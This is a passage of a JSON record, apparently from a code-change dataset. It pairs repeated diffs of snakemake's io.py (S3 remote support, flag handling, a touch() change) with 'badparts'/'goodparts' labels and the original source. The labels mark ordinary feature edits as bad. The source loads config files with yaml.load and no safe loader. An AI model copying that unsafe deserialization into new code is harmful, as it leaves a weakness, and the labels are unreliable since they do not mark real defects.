lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]},{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, \"{*}\")\n\n    def __eq__(self, other):\n        f = other._file if isinstance(other, _IOFile) else other\n        return self._file == f\n\n    def __hash__(self):\n        return self._file.__hash__()\n\n\n_wildcard_regex = re.compile(\n    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\")\n\n#    \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>[^\\}]*))?\\s*\\}\")\n\n\ndef wait_for_files(files, latency_wait=3):\n    \"\"\"Wait for given files to be present in filesystem.\"\"\"\n    files = list(files)\n    get_missing = lambda: [f for f in files if not os.path.exists(f)]\n    missing = get_missing()\n    if missing:\n        logger.info(\"Waiting at most {} seconds for missing files.\".format(\n            latency_wait))\n        for _ in range(latency_wait):\n            if not get_missing():\n                return\n            time.sleep(1)\n        raise IOError(\"Missing files after {} seconds:\\n{}\".format(\n            latency_wait, \"\\n\".join(get_missing())))\n\n\ndef get_wildcard_names(pattern):\n    return set(match.group('name')\n               for match in _wildcard_regex.finditer(pattern))\n\n\ndef contains_wildcard(path):\n    return _wildcard_regex.search(path) is not None\n\n\ndef remove(file):\n    if os.path.exists(file):\n        if os.path.isdir(file):\n            try:\n                os.removedirs(file)\n            except OSError:\n                # ignore non empty directories\n                pass\n        else:\n            os.remove(file)\n\n\ndef regex(filepattern):\n    f = []\n    last = 0\n    wildcards = set()\n    for match in _wildcard_regex.finditer(filepattern):\n        f.append(re.escape(filepattern[last:match.start()]))\n        wildcard = match.group(\"name\")\n        if wildcard in wildcards:\n            if match.group(\"constraint\"):\n                raise ValueError(\n                    \"If multiple wildcards of the same name \"\n                    \"appear in a string, eventual constraints have to be defined \"\n                    \"at the first occurence and will be inherited by the others.\")\n            f.append(\"(?P={})\".format(wildcard))\n        else:\n            wildcards.add(wildcard)\n            f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if\n                                         match.group(\"constraint\") else \".+\"))\n        last = match.end()\n    f.append(re.escape(filepattern[last:]))\n    f.append(\"$\")  # ensure that the match spans the whole file\n    return \"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one 